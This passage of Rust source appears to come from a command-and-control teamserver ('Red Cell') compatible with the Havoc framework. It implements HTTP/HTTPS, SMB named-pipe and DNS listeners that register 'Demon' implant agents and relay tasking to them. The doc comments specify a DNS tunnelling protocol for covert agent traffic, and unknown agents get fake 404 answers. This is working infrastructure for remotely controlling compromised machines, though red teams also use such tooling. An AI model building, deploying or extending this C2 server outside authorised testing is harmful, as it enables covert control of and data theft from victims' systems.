        status.eq_ignore_ascii_case("online") || status.eq_ignore_ascii_case("start")
    })
}

/// Convert a listener lifecycle action into a Havoc-compatible event payload.
#[must_use]
pub fn listener_event_for_action(
    user: &str,
    summary: &ListenerSummary,
    action: ListenerEventAction,
) -> OperatorMessage {
    match action {
        ListenerEventAction::Created => OperatorMessage::ListenerNew(Message {
            head: listener_message_head(user),
            info: summary.to_operator_info(),
        }),
        ListenerEventAction::Updated => OperatorMessage::ListenerEdit(Message {
            head: listener_message_head(user),
            info: summary.to_operator_info(),
        }),
        ListenerEventAction::Started => OperatorMessage::ListenerMark(Message {
            head: listener_message_head(user),
            info: ListenerMarkInfo { name: summary.name.clone(), mark: "Online".to_owned() },
        }),
        ListenerEventAction::Stopped => OperatorMessage::ListenerMark(Message {
            head: listener_message_head(user),
            info: ListenerMarkInfo { name: summary.name.clone(), mark: "Offline".to_owned() },
        }),
    }
}

/// Convert a listener error into a Havoc-compatible event payload.
#[must_use]
pub fn listener_error_event(
    user: &str,
    name: &str,
    error: &ListenerManagerError,
) -> OperatorMessage {
    OperatorMessage::ListenerError(Message {
        head: listener_message_head(user),
        info: ListenerErrorInfo { error: error.to_string(), name: name.to_owned() },
    })
}

/// Convert a deletion event into a Havoc-compatible operator payload.
#[must_use]
pub fn listener_removed_event(user: &str, name: &str) -> OperatorMessage {
    OperatorMessage::ListenerRemove(Message {
        head: listener_message_head(user),
        info: NameInfo { name: name.to_owned() },
    })
}

/// The lifecycle action represented by an operator or REST request.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ListenerEventAction {
    /// A new listener was created.
    Created,
    /// An existing listener was updated.
    Updated,
    /// A listener was started.
    Started,
    /// A listener was stopped.
    Stopped,
}

/// Parse a WebSocket listener mark value into a lifecycle action.
pub fn action_from_mark(mark: &str) -> Result<ListenerEventAction, ListenerManagerError> {
    if mark.eq_ignore_ascii_case("online")
        || mark.eq_ignore_ascii_case("start")
        || mark.eq_ignore_ascii_case("running")
    {
        Ok(ListenerEventAction::Started)
    } else if mark.eq_ignore_ascii_case("offline")
        || mark.eq_ignore_ascii_case("stop")
        || mark.eq_ignore_ascii_case("stopped")
    {
        Ok(ListenerEventAction::Stopped)
    } else {
        Err(ListenerManagerError::UnsupportedMark { mark: mark.to_owned() })
    }
}

fn listener_message_head(user: &str) -> MessageHead {
    MessageHead {
        event: EventCode::Listener,
        user: user.to_owned(),
        timestamp: String::new(),
        one_time: String::new(),
    }
}

fn operator_status(status: ListenerStatus) -> &'static str {
    match status {
        ListenerStatus::Running => "Online",
        ListenerStatus::Created | ListenerStatus::Stopped | ListenerStatus::Error => "Offline",
    }
}

fn operator_protocol_name(config: &ListenerConfig) -> String {
    match config {
        ListenerConfig::Http(config) if config.secure => "Https".to_owned(),
        ListenerConfig::Dns(_) => "Dns".to_owned(),
        _ => config.protocol().as_str().to_owned(),
    }
}

fn profile_listener_configs(profile: &Profile) -> Vec<ListenerConfig> {
    let mut listeners = Vec::new();
    listeners.extend(profile.listeners.http.iter().cloned().map(|config| {
        ListenerConfig::from(HttpListenerConfig {
            name: config.name,
            kill_date: config.kill_date,
            working_hours: config.working_hours,
            hosts: config.hosts,
            host_bind: config.host_bind,
            host_rotation: config.host_rotation,
            port_bind: config.port_bind,
            port_conn: config.port_conn,
            method: config.method,
            behind_redirector: profile.demon.trust_x_forwarded_for,
            trusted_proxy_peers: profile.demon.trusted_proxy_peers.clone(),
            user_agent: config.user_agent,
            headers: config.headers,
            uris: config.uris,
            host_header: config.host_header,
            secure: config.secure,
            cert: config
                .cert
                .map(|cert| red_cell_common::ListenerTlsConfig { cert: cert.cert, key: cert.key }),
            response: config.response.map(|response| HttpListenerResponseConfig {
                headers: response.headers,
                body: response.body,
            }),
            proxy: config.proxy.map(|proxy| HttpListenerProxyConfig {
                enabled: true,
                proxy_type: Some("http".to_owned()),
                host: proxy.host,
                port: proxy.port,
                username: proxy.username,
                password: proxy.password,
            }),
        })
    }));
    listeners.extend(profile.listeners.smb.iter().cloned().map(|config| {
        ListenerConfig::from(SmbListenerConfig {
            name: config.name,
            pipe_name: config.pipe_name,
            kill_date: config.kill_date,
            working_hours: config.working_hours,
        })
    }));
    listeners.extend(profile.listeners.external.iter().cloned().map(|config| {
        ListenerConfig::from(ExternalListenerConfig {
            name: config.name,
            endpoint: config.endpoint,
        })
    }));
    listeners.extend(profile.listeners.dns.iter().cloned().map(|config| {
        ListenerConfig::from(DnsListenerConfig {
            name: config.name,
            host_bind: config.host_bind,
            port_bind: config.port_bind,
            domain: config.domain,
            record_types: config.record_types,
            kill_date: config.kill_date,
            working_hours: config.working_hours,
        })
    }));
    listeners
}

#[allow(clippy::too_many_arguments)]
async fn spawn_http_listener_runtime(
    config: &HttpListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    demon_init_rate_limiter: DemonInitRateLimiter,
    shutdown: ShutdownController,
    max_download_bytes: u64,
) -> Result<ListenerRuntimeFuture, ListenerManagerError> {
    let state = Arc::new(HttpListenerState::build(
        config,
        registry,
        events,
        database,
        sockets,
        plugins,
        demon_init_rate_limiter,
        shutdown,
        max_download_bytes,
    )?);
    let address = format!("{}:{}", config.host_bind, config.port_bind);
    let listener = TcpListener::bind(address.as_str()).await.map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind {address}: {error}"),
        }
    })?;
    let std_listener = listener.into_std().map_err(|error| ListenerManagerError::StartFailed {
        name: config.name.clone(),
        message: format!("failed to convert bound socket {address} into std listener: {error}"),
    })?;
    let router = Router::new().fallback(any(http_listener_handler)).with_state(state.clone());

    if config.secure {
        install_default_crypto_provider();
        let tls_config = build_http_tls_config(config).await?;
        let server = axum_server::from_tcp_rustls(std_listener, tls_config).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTPS listener on {address}: {error}"),
            }
        })?;

        let listener_name = state.config.name.clone();
        Ok(Box::pin(async move {
            server
                .serve(router.into_make_service_with_connect_info::<SocketAddr>())
                .await
                .map_err(|error| format!("https listener `{listener_name}` exited: {error}"))
        }))
    } else {
        let server = axum_server::from_tcp(std_listener).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTP listener on {address}: {error}"),
            }
        })?;

        let listener_name = state.config.name.clone();
        Ok(Box::pin(async move {
            server
                .serve(router.into_make_service_with_connect_info::<SocketAddr>())
                .await
                .map_err(|error| format!("http listener `{listener_name}` exited: {error}"))
        }))
    }
}

async fn build_callback_response(
    dispatcher: &CommandDispatcher,
    agent_id: u32,
    packages: &[crate::DemonCallbackPackage],
) -> Result<Vec<u8>, ListenerManagerError> {
    dispatcher.dispatch_packages(agent_id, packages).await.map_err(map_command_dispatch_error)
}

async fn process_demon_transport(
    listener_name: &str,
    registry: &AgentRegistry,
    database: &Database,
    parser: &DemonPacketParser,
    events: &EventBus,
    dispatcher: &CommandDispatcher,
    body: &[u8],
    external_ip: String,
) -> Result<ProcessedDemonResponse, ListenerManagerError> {
    match parser.parse_for_listener(body, external_ip.as_str(), listener_name).await {
        Ok(ParsedDemonPacket::Init(init)) => {
            let response =
                build_init_ack(registry, init.agent.agent_id).await.map_err(|error| {
                    ListenerManagerError::InvalidConfig {
                        message: format!("failed to build demon init ack: {error}"),
                    }
                })?;

            let pivots = registry.pivots(init.agent.agent_id).await;
            events.broadcast(agent_new_event(
                listener_name,
                init.header.magic,
                &init.agent,
                &pivots,
            ));
            Ok(ProcessedDemonResponse {
                agent_id: init.agent.agent_id,
                payload: response,
                http_disposition: DemonHttpDisposition::Ok,
            })
        }
        Ok(ParsedDemonPacket::Reconnect { header, .. }) => {
            let (payload, http_disposition) = if registry.get(header.agent_id).await.is_some() {
                build_reconnect_ack(registry, header.agent_id)
                    .await
                    .map_err(|error| ListenerManagerError::InvalidConfig {
                        message: format!("failed to build reconnect ack: {error}"),
                    })
                    .map(|payload| (payload, DemonHttpDisposition::Ok))?
            } else {
                warn!(
                    listener = listener_name,
                    agent_id = format_args!("{:08X}", header.agent_id),
                    external_ip,
                    "unknown agent sent reconnect probe"
                );
                record_unknown_reconnect_probe(
                    database,
                    listener_name,
                    header.agent_id,
                    &external_ip,
                )
                .await;
                (Vec::new(), DemonHttpDisposition::Fake404)
            };

            Ok(ProcessedDemonResponse { agent_id: header.agent_id, payload, http_disposition })
        }
        Ok(ParsedDemonPacket::Callback { header, packages }) => {
            let payload = build_callback_response(dispatcher, header.agent_id, &packages).await?;

            Ok(ProcessedDemonResponse {
                agent_id: header.agent_id,
                payload,
                http_disposition: DemonHttpDisposition::Ok,
            })
        }
        Err(error) => Err(ListenerManagerError::InvalidConfig {
            message: format!("failed to parse demon callback: {error}"),
        }),
    }
}

async fn record_unknown_reconnect_probe(
    database: &Database,
    listener_name: &str,
    agent_id: u32,
    external_ip: &str,
) {
    let details = audit_details(
        AuditResultStatus::Failure,
        Some(agent_id),
        Some("reconnect_probe"),
        Some(parameter_object([
            ("listener", serde_json::Value::String(listener_name.to_owned())),
            ("external_ip", serde_json::Value::String(external_ip.to_owned())),
        ])),
    );

    if let Err(error) = record_operator_action(
        database,
        "teamserver",
        "agent.reconnect_probe",
        "agent",
        Some(format!("{agent_id:08X}")),
        details,
    )
    .await
    {
        warn!(
            listener = listener_name,
            agent_id = format_args!("{agent_id:08X}"),
            %error,
            "failed to persist unknown reconnect probe audit entry"
        );
    }
}

fn map_command_dispatch_error(error: CommandDispatchError) -> ListenerManagerError {
    ListenerManagerError::InvalidConfig { message: error.to_string() }
}

fn classify_demon_transport(body: &[u8]) -> Option<DemonTransportKind> {
    let envelope = DemonEnvelope::from_bytes(body).ok()?;
    if envelope.payload.len() < 8 {
        return None;
    }

    let command_id = u32::from_be_bytes(envelope.payload[0..4].try_into().ok()?);
    if command_id != u32::from(DemonCommand::DemonInit) {
        return Some(DemonTransportKind::Callback);
    }

    let remaining = &envelope.payload[8..];
    if remaining.is_empty() {
        Some(DemonTransportKind::Reconnect)
    } else {
        Some(DemonTransportKind::Init)
    }
}

async fn allow_demon_init_for_ip(
    listener_name: &str,
    rate_limiter: &DemonInitRateLimiter,
    client_ip: IpAddr,
    body: &[u8],
) -> bool {
    if classify_demon_transport(body) != Some(DemonTransportKind::Init) {
        return true;
    }

    if rate_limiter.allow(client_ip).await {
        return true;
    }

    warn!(
        listener = listener_name,
        client_ip = %client_ip,
        max_attempts = MAX_DEMON_INIT_ATTEMPTS_PER_IP,
        window_seconds = DEMON_INIT_WINDOW_DURATION.as_secs(),
        "rejecting DEMON_INIT because the per-IP rate limit was exceeded"
    );
    false
}

#[allow(clippy::too_many_arguments)]
async fn spawn_smb_listener_runtime(
    config: &SmbListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    demon_init_rate_limiter: DemonInitRateLimiter,
    shutdown: ShutdownController,
    max_download_bytes: u64,
) -> Result<ListenerRuntimeFuture, ListenerManagerError> {
    let state = Arc::new(SmbListenerState::build(
        config,
        registry,
        events,
        database,
        sockets,
        plugins,
        demon_init_rate_limiter,
        shutdown,
        max_download_bytes,
    ));
    let listener_name = normalized_smb_pipe_name(&config.pipe_name);
    let socket_name = smb_local_socket_name(&config.pipe_name).map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to resolve SMB pipe `{listener_name}`: {error}"),
        }
    })?;
    let listener = ListenerOptions::new().name(socket_name).create_tokio().map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind SMB pipe `{listener_name}`: {error}"),
        }
    })?;

    Ok(Box::pin(async move {
        loop {
            tokio::select! {
                _ = state.shutdown.notified() => return Ok(()),
                accept = listener.accept() => {
                    match accept {
                        Ok(stream) => {
                            let state = state.clone();
                            tokio::spawn(async move {
                                handle_smb_connection(state, stream).await;
                            });
                        }
                        Err(error) => {
                            return Err(format!(
                                "smb listener `{}` on pipe `{listener_name}` exited: {error}",
                                state.config.name
                            ));
                        }
                    }
                }
            }
        }
    }))
}

async fn handle_smb_connection(state: Arc<SmbListenerState>, mut stream: LocalSocketStream) {
    loop {
        if state.shutdown.is_shutting_down() {
            break;
        }

        let frame = match read_smb_frame(&mut stream).await {
            Ok(Some(frame)) => frame,
            Ok(None) => break,
            Err(error) => {
                warn!(listener = %state.config.name, %error, "failed to read smb frame");
                break;
            }
        };

        if !is_valid_demon_callback_request(&frame.payload) {
            warn!(
                listener = %state.config.name,
                agent_id = format_args!("{:08X}", frame.agent_id),
                "ignoring invalid smb demon frame"
            );
            continue;
        }

        let Some(_callback_guard) = state.shutdown.try_track_callback() else {
            break;
        };

        let client_ip = IpAddr::V4(Ipv4Addr::LOCALHOST);
        if !allow_demon_init_for_ip(
            &state.config.name,
            &state.demon_init_rate_limiter,
            client_ip,
            &frame.payload,
        )
        .await
        {
            continue;
        }

        match process_demon_transport(
            &state.config.name,
            &state.registry,
            &state.database,
            &state.parser,
            &state.events,
            &state.dispatcher,
            &frame.payload,
            client_ip.to_string(),
        )
        .await
        {
            Ok(response) => {
                if response.payload.is_empty() {
                    continue;
                }

                if let Err(error) =
                    write_smb_frame(&mut stream, response.agent_id, &response.payload).await
                {
                    warn!(
                        listener = %state.config.name,
                        agent_id = format_args!("{:08X}", response.agent_id),
                        %error,
                        "failed to write smb response"
                    );
                    break;
                }
            }
            Err(error) => {
                warn!(
                    listener = %state.config.name,
                    agent_id = format_args!("{:08X}", frame.agent_id),
                    %error,
                    "failed to process smb demon frame"
                );
            }
        }
    }
}

#[derive(Debug)]
struct SmbFrame {
    agent_id: u32,
    payload: Vec<u8>,
}

async fn read_smb_frame(stream: &mut LocalSocketStream) -> io::Result<Option<SmbFrame>> {
    let agent_id = match stream.read_u32_le().await {
        Ok(agent_id) => agent_id,
        Err(error) if error.kind() == io::ErrorKind::UnexpectedEof => return Ok(None),
        Err(error) => return Err(error),
    };
    let payload_len = match stream.read_u32_le().await {
        Ok(length) => length,
        Err(error) if error.kind() == io::ErrorKind::UnexpectedEof => return Ok(None),
        Err(error) => return Err(error),
    };
    let payload_len = usize::try_from(payload_len).map_err(|_| {
        io::Error::new(io::ErrorKind::InvalidData, "smb frame payload length overflowed usize")
    })?;
    if payload_len > MAX_SMB_FRAME_PAYLOAD_LEN {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!(
                "smb frame payload length {payload_len} exceeds maximum of {MAX_SMB_FRAME_PAYLOAD_LEN} bytes"
            ),
        ));
    }
    let mut payload = vec![0_u8; payload_len];
    stream.read_exact(&mut payload).await?;
    Ok(Some(SmbFrame { agent_id, payload }))
}

async fn write_smb_frame(
    stream: &mut LocalSocketStream,
    agent_id: u32,
    payload: &[u8],
) -> io::Result<()> {
    let payload_len = u32::try_from(payload.len()).map_err(|_| {
        io::Error::new(io::ErrorKind::InvalidInput, "smb frame payload exceeds u32 length")
    })?;
    stream.write_u32_le(agent_id).await?;
    stream.write_u32_le(payload_len).await?;
    stream.write_all(payload).await?;
    stream.flush().await
}

fn normalized_smb_pipe_name(pipe_name: &str) -> String {
    let trimmed = pipe_name.trim();
    if trimmed.starts_with('/') || trimmed.starts_with(r"\\") {
        trimmed.to_owned()
    } else {
        format!("{SMB_PIPE_PREFIX}{trimmed}")
    }
}

#[cfg(unix)]
fn smb_local_socket_name(pipe_name: &str) -> io::Result<interprocess::local_socket::Name<'static>> {
    if pipe_name.trim_start().starts_with('/') {
        pipe_name.to_fs_name::<FilesystemUdSocket>().map(|name| name.into_owned())
    } else {
        normalized_smb_pipe_name(pipe_name)
            .to_ns_name::<AbstractNsUdSocket>()
            .map(|name| name.into_owned())
    }
}

#[cfg(windows)]
fn smb_local_socket_name(pipe_name: &str) -> io::Result<interprocess::local_socket::Name<'static>> {
    normalized_smb_pipe_name(pipe_name).to_fs_name::<NamedPipe>().map(|name| name.into_owned())
}

impl ListenerManager {
    async fn spawn_listener_runtime(
        &self,
        config: &ListenerConfig,
    ) -> Result<JoinHandle<()>, ListenerManagerError> {
        let runtime = match config {
            ListenerConfig::Http(config) => {
                spawn_http_listener_runtime(
                    config,
                    self.agent_registry.clone(),
                    self.events.clone(),
                    self.database.clone(),
                    self.sockets.clone(),
                    self.plugins.clone(),
                    self.demon_init_rate_limiter.clone(),
                    self.shutdown.clone(),
                    self.max_download_bytes,
                )
                .await
            }
            ListenerConfig::Smb(config) => {
                spawn_smb_listener_runtime(
                    config,
                    self.agent_registry.clone(),
                    self.events.clone(),
                    self.database.clone(),
                    self.sockets.clone(),
                    self.plugins.clone(),
                    self.demon_init_rate_limiter.clone(),
                    self.shutdown.clone(),
                    self.max_download_bytes,
                )
                .await
            }
            ListenerConfig::External(config) => Err(unsupported_external_listener_error(config)),
            ListenerConfig::Dns(config) => {
                spawn_dns_listener_runtime(
                    config,
                    self.agent_registry.clone(),
                    self.events.clone(),
                    self.database.clone(),
                    self.sockets.clone(),
                    self.plugins.clone(),
                    self.demon_init_rate_limiter.clone(),
                    self.shutdown.clone(),
                    self.max_download_bytes,
                )
                .await
            }
        }?;

        Ok(spawn_managed_listener_task(
            config.name().to_owned(),
            runtime,
            self.repository(),
            self.active_handles.clone(),
        ))
    }
}

fn ensure_listener_creation_supported(config: &ListenerConfig) -> Result<(), ListenerManagerError> {
    match config {
        ListenerConfig::External(config) => {
            return Err(ListenerManagerError::InvalidConfig {
                message: external_listener_unsupported_message(&config.name),
            });
        }
        ListenerConfig::Http(_) | ListenerConfig::Smb(_) | ListenerConfig::Dns(_) => {}
    }

    Ok(())
}

fn is_ignored_restore_start_failure(config: &ListenerConfig, error: &ListenerManagerError) -> bool {
    matches!(
        (config, error),
        (ListenerConfig::External(_), ListenerManagerError::StartFailed { .. })
    )
}

fn unsupported_external_listener_error(config: &ExternalListenerConfig) -> ListenerManagerError {
    ListenerManagerError::StartFailed {
        name: config.name.clone(),
        message: format!(
            "{}; endpoint `{}` cannot be started",
            external_listener_unsupported_message(&config.name),
            config.endpoint
        ),
    }
}

fn external_listener_unsupported_message(name: &str) -> String {
    format!(
        "external/service bridge listener `{name}` is not supported yet; remove it from the active Red Cell listener surface"
    )
}

// ── DNS C2 Listener ──────────────────────────────────────────────────────────

/// DNS wire-format header length in bytes.
const DNS_HEADER_LEN: usize = 12;
/// DNS record type for TXT records.
const DNS_TYPE_TXT: u16 = 16;
/// DNS record type for A records.
const DNS_TYPE_A: u16 = 1;
/// DNS record type for CNAME records.
const DNS_TYPE_CNAME: u16 = 5;
/// DNS record class IN.
const DNS_CLASS_IN: u16 = 1;
/// DNS flag: Query/Response bit.
const DNS_FLAG_QR: u16 = 0x8000;
/// DNS flag: Authoritative Answer bit.
const DNS_FLAG_AA: u16 = 0x0400;
/// DNS RCODE: No Error.
const DNS_RCODE_NOERROR: u16 = 0;
/// DNS RCODE: Refused.
const DNS_RCODE_REFUSED: u16 = 5;
/// Maximum age in seconds before a pending DNS upload is discarded.
const DNS_UPLOAD_TIMEOUT_SECS: u64 = 120;
/// How often the DNS listener prunes expired upload sessions.
const DNS_UPLOAD_CLEANUP_INTERVAL_SECS: u64 = 30;
/// Maximum number of chunks accepted for a single DNS upload.
const DNS_MAX_UPLOAD_CHUNKS: u16 = 256;
/// Maximum number of concurrent DNS upload sessions retained in memory.
const DNS_MAX_PENDING_UPLOADS: usize = 1000;
/// Maximum response chunk size in bytes (encoded as base32hex in a TXT string).
/// 200 base32hex chars × 5 bits ÷ 8 = 125 bytes.
const DNS_RESPONSE_CHUNK_BYTES: usize = 125;
/// Base32hex alphabet (RFC 4648 §7): 0-9 followed by A-V.
const BASE32HEX_ALPHABET: &[u8; 32] = b"0123456789ABCDEFGHIJKLMNOPQRSTUV";

/// In-progress multi-chunk upload reassembly buffer for a DNS C2 agent.
#[derive(Debug)]
struct DnsPendingUpload {
    /// Received chunks indexed by sequence number.
    chunks: HashMap<u16, Vec<u8>>,
    /// Total number of expected chunks.
    total: u16,
    /// Timestamp of the first chunk (for expiry tracking).
    received_at: Instant,
}

/// Pre-chunked C2 response ready to be polled by a DNS agent.
#[derive(Debug)]
struct DnsPendingResponse {
    /// Base32hex-encoded response chunks.
    chunks: Vec<String>,
    /// Timestamp of when the response was queued for download.
    received_at: Instant,
}

#[derive(Debug, PartialEq, Eq)]
enum DnsUploadAssembly {
    Pending,
    Complete(Vec<u8>),
    Rejected,
}

/// Shared runtime state for the DNS C2 listener.
///
/// # DNS C2 Protocol
///
/// All DNS queries targeting the configured [`DnsListenerConfig::domain`] are
/// treated as C2 traffic. Two query sub-types are supported:
///
/// ## Upload (agent → teamserver)
///
/// ```text
/// <B32HEX-CHUNK>.<SEQ>-<TOTAL>-<AGENTID>.up.<DOMAIN>
/// ```
///
/// * `B32HEX-CHUNK` — base32hex-encoded data slice (max 39 bytes per label)
/// * `SEQ` — zero-based hex chunk index
/// * `TOTAL` — hex total chunk count
/// * `AGENTID` — 8-character lowercase hex agent identifier
///
/// The listener acknowledges each chunk with a TXT response:
/// * `ok`  — chunk stored; more chunks expected
/// * `ack` — all chunks received and the Demon packet was processed
/// * `err` — reassembly or Demon protocol error
///
/// ## Download (teamserver → agent)
///
/// ```text
/// <SEQ>-<AGENTID>.dn.<DOMAIN>
/// ```
///
/// The server responds with a TXT record:
/// * `wait`              — no response queued for this agent
/// * `<TOTAL> <B32HEX>` — total chunk count and the requested chunk
/// * `done`              — `SEQ` is past the end of the response
#[derive(Debug)]
struct DnsListenerState {
    config: DnsListenerConfig,
    registry: AgentRegistry,
    database: Database,
    parser: DemonPacketParser,
    events: EventBus,
    dispatcher: CommandDispatcher,
    demon_init_rate_limiter: DemonInitRateLimiter,
    shutdown: ShutdownController,
    /// Pending uploads keyed by agent ID.
    uploads: Mutex<HashMap<u32, DnsPendingUpload>>,
    /// Pending responses keyed by agent ID.
    responses: Mutex<HashMap<u32, DnsPendingResponse>>,
}

impl DnsListenerState {
    #[allow(clippy::too_many_arguments)]
    fn new(
        config: &DnsListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        demon_init_rate_limiter: DemonInitRateLimiter,
        shutdown: ShutdownController,
        max_download_bytes: u64,
    ) -> Self {
        Self {
            config: config.clone(),
            registry: registry.clone(),
            database: database.clone(),
            parser: DemonPacketParser::new(registry.clone()),
            events: events.clone(),
            dispatcher: CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
                registry.clone(),
                events.clone(),
                database,
                sockets,
                plugins,
                max_download_bytes,
            ),
            demon_init_rate_limiter,
            shutdown,
            uploads: Mutex::new(HashMap::new()),
            responses: Mutex::new(HashMap::new()),
        }
    }

    async fn handle_dns_packet(&self, buf: &[u8], peer_ip: IpAddr) -> Option<Vec<u8>> {
        let query = parse_dns_query(buf)?;
        let Some(allowed_qtypes) = dns_allowed_query_types(&self.config.record_types) else {
            warn!(
                listener = %self.config.name,
                record_types = %self.config.record_types.join(","),
                "dns listener has unsupported record type configuration"
            );
            return Some(build_dns_refused_response(query.id));
        };

        if !allowed_qtypes.contains(&query.qtype) {
            return Some(build_dns_refused_response(query.id));
        }

        let Some(c2_query) = parse_dns_c2_query(&query.labels, &self.config.domain) else {
            return Some(build_dns_refused_response(query.id));
        };

        match c2_query {
            DnsC2Query::Upload { agent_id, seq, total, data } => {
                let txt = self.handle_upload(agent_id, seq, total, data, peer_ip).await;
                Some(build_dns_txt_response(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
            DnsC2Query::Download { agent_id, seq } => {
                let txt = self.handle_download(agent_id, seq).await;
                Some(build_dns_txt_response(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
        }
    }

    async fn handle_upload(
        &self,
        agent_id: u32,
        seq: u16,
        total: u16,
        data: Vec<u8>,
        peer_ip: IpAddr,
    ) -> &'static str {
        let assembled = match self.try_assemble_upload(agent_id, seq, total, data).await {
            DnsUploadAssembly::Pending => return "ok",
            DnsUploadAssembly::Rejected => return "err",
            DnsUploadAssembly::Complete(assembled) => assembled,
        };

        let Some(_callback_guard) = self.shutdown.try_track_callback() else {
            return "err";
        };

        if !is_valid_demon_callback_request(&assembled) {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                "dns upload produced invalid demon packet; discarding"
            );
            return "err";
        }

        if !allow_demon_init_for_ip(
            &self.config.name,
            &self.demon_init_rate_limiter,
            peer_ip,
            &assembled,
        )
        .await
        {
            return "err";
        }

        match process_demon_transport(
            &self.config.name,
            &self.registry,
            &self.database,
            &self.parser,
            &self.events,
            &self.dispatcher,
            &assembled,
            peer_ip.to_string(),
        )
        .await
        {
            Ok(response) => {
                if !response.payload.is_empty() {
                    let chunks = chunk_response_to_b32hex(&response.payload);
                    self.responses.lock().await.insert(
                        agent_id,
                        DnsPendingResponse { chunks, received_at: Instant::now() },
                    );
                }
                "ack"
            }
            Err(error) => {
                warn!(
                    listener = %self.config.name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %error,
                    "dns upload demon processing failed"
                );
                "err"
            }
        }
    }

    async fn cleanup_expired_uploads(&self) {
        let mut uploads = self.uploads.lock().await;
        uploads
            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
        drop(uploads);

        let mut responses = self.responses.lock().await;
        responses
            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
    }

    async fn handle_download(&self, agent_id: u32, seq: u16) -> String {
        let mut responses = self.responses.lock().await;
        let Some(pending) = responses.get(&agent_id) else {
            return "wait".to_owned();
        };

        let idx = usize::from(seq);
        let total = pending.chunks.len();
        if idx >= total {
            responses.remove(&agent_id);
            "done".to_owned()
        } else {
            format!("{} {}", total, pending.chunks[idx])
        }
    }

    /// Try to assemble a complete upload from buffered chunks.
    ///
    /// Returns [`DnsUploadAssembly::Complete`] when all chunks are present,
    /// [`DnsUploadAssembly::Pending`] while more chunks are still expected,
    /// and [`DnsUploadAssembly::Rejected`] when the upload metadata or state is invalid.
    async fn try_assemble_upload(
        &self,
        agent_id: u32,
        seq: u16,
        total: u16,
        data: Vec<u8>,
    ) -> DnsUploadAssembly {
        if total == 0 || total > DNS_MAX_UPLOAD_CHUNKS {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                seq,
                total,
                max_total = DNS_MAX_UPLOAD_CHUNKS,
                "dns upload rejected due to invalid total chunk count"
            );
            return DnsUploadAssembly::Rejected;
        }

        if seq >= total {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                seq,
                total,
                "dns upload rejected because chunk sequence exceeds declared total"
            );
            return DnsUploadAssembly::Rejected;
        }

        let mut uploads = self.uploads.lock().await;

        if let Some(existing) = uploads.get(&agent_id)
            && existing.total != total
        {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                received_total = total,
                expected_total = existing.total,
                "dns upload rejected due to inconsistent chunk total"
            );
            uploads.remove(&agent_id);
            return DnsUploadAssembly::Rejected;
        }

        if !uploads.contains_key(&agent_id) && uploads.len() >= DNS_MAX_PENDING_UPLOADS {
            warn!(
                listener = %self.config.name,
                agent_id = format_args!("{agent_id:08X}"),
                active_uploads = uploads.len(),
                max_uploads = DNS_MAX_PENDING_UPLOADS,
                "dns upload rejected because pending upload capacity has been reached"
            );
            return DnsUploadAssembly::Rejected;
        }

        let entry = uploads.entry(agent_id).or_insert_with(|| DnsPendingUpload {
            chunks: HashMap::new(),
            total,
            received_at: Instant::now(),
        });
        entry.chunks.insert(seq, data);

        let expected = entry.total;
        if entry.chunks.len() < usize::from(expected) {
            return DnsUploadAssembly::Pending;
        }

        // All chunks present — assemble in order
        let mut assembled = Vec::new();
        for i in 0..expected {
            match entry.chunks.get(&i) {
                Some(chunk) => assembled.extend_from_slice(chunk),
                None => {
                    warn!(
                        listener = %self.config.name,
                        agent_id = format_args!("{agent_id:08X}"),
                        "dns upload missing chunk {i}/{expected}; discarding"
                    );
                    uploads.remove(&agent_id);
                    return DnsUploadAssembly::Rejected;
                }
            }
        }
        uploads.remove(&agent_id);
        DnsUploadAssembly::Complete(assembled)
    }
}

fn dns_allowed_query_types(record_types: &[String]) -> Option<Vec<u16>> {
    let configured =
        if record_types.is_empty() { vec!["TXT".to_owned()] } else { record_types.to_vec() };

    let mut allowed = Vec::new();
    for record_type in configured {
        let qtype = match record_type.trim().to_ascii_uppercase().as_str() {
            "A" => DNS_TYPE_A,
            "TXT" => DNS_TYPE_TXT,
            "CNAME" => DNS_TYPE_CNAME,
            _ => return None,
        };

        if !allowed.contains(&qtype) {
            allowed.push(qtype);
        }
    }

    Some(allowed)
}

/// A parsed DNS C2 query from a Demon agent.
enum DnsC2Query {
    /// Upload chunk: `<b32hex-data>.<seq>-<total>-<agentid>.up.<domain>`
    Upload { agent_id: u32, seq: u16, total: u16, data: Vec<u8> },
    /// Download request: `<seq>-<agentid>.dn.<domain>`
    Download { agent_id: u32, seq: u16 },
}

/// A minimally parsed DNS query sufficient for C2 processing.
struct ParsedDnsQuery {
    id: u16,
    /// Raw wire-format QNAME bytes (including final zero label).
    qname_raw: Vec<u8>,
    /// Lowercase parsed labels.
    labels: Vec<String>,
    qtype: u16,
}

/// Parse the first question from a raw DNS UDP payload.
///
/// Returns `None` if the packet is malformed or has ≠ 1 question.
fn parse_dns_query(buf: &[u8]) -> Option<ParsedDnsQuery> {
    if buf.len() < DNS_HEADER_LEN {
        return None;
    }

